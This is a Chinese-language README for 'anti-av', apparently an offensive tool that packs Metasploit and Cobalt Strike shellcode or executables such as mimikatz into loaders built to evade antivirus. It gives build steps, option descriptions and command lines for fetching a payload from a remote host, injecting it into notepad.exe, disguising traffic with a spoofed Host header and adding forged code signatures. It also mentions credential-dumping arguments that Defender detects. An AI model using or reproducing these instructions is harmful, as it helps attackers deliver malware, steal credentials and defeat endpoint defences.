# ANTI-AV

## 免责

本工具学习使用.

## 描述
* shellcode*免杀加载，*payload*支持**msf** (-f raw)和**cs**(payload raw)

* 任意执行文件免杀加载，payload为pe格式

  ​	注意：执行免杀时，如果不带参数可以绕过av监测，带参数的那啥目前测试defender过不了，估计有参数黑名单）


## 安装

### Requirement

```bash
1、建议使用Mac或linux环境（推荐）

2、安装交叉编译 mingw64(必须)

3、混淆工具garble(必须)

4、nasm （必须）

5、安装签名 openssl、osslsigncode（非必须）
```

### anti-av

```bash
git clone https://github.com/b1gcat/anti-av.git
go build

Usage of ./anti-av:
  -arch string
        生成文件格式amd64,386 (default "386")
  -asm
        asm调用敏感函数
  -e    生成payload.e
  -ho string
        远程加载payload.e时,在GET请求头中替换host实现流量混淆 (default "wwww.baidu.com")
  -l string
        支持的加载类型: sc (default "sc")
  -mode string
        支持normal,inject (default "normal")
  -nosign
        关闭签名
  -o string
        输出文件名字 (default "output.exe")
  -os string
        OS: windows,linux (default "windows")
  -p string
        Payload: 
                1.支持 远程远程加载payload.e(参考payload.e生成实例)
                2.支持MSF payload generate by '-f raw'.
                3.支持CS raw payload.
                 (default "payload.bin")
  -v string
        签名: baidu.com 或 nvidia_leak (default "nvidia_leak")

```



## 使用方案



| 形态              | 说明                    | 生成命令                                                     |
| ----------------- | ----------------------- | ------------------------------------------------------------ |
| 自解密   | 无                      | ./anti-av -p ~/Desktop/payload.bin                         |
| 远程加载 | 无                      | 1、生成payload.e<br />./anti-av  -e -p ~/Desktop/payload.bin    <br /><br />2、上传payload.e到公共下载服务<br />略<br /><br />3、制作加载器<br />./anti-av -p http://x.x.x.x/payload.e |
| 进程注入          | 会强制注入到notepad.exe | ./anti-av -p ~/Desktop/payload.bin -inject 或<br /><br />./anti-av -p http://x.x.x.x/payload.e  -inject |
| 加载pe文件 |  | ./anti-av -l pe -p ~/Downloads/mimikatz_trunk_x64/x64/mimikatz.exe |



## 注意

* CS生成raw格式64位 payload，需要勾选x64

* PE加载时如果带参数例如: `anttav_windows_amd64 "privilege::debug" "sekurlsa::logonpasswords" "exit"`,此时会被拦截。

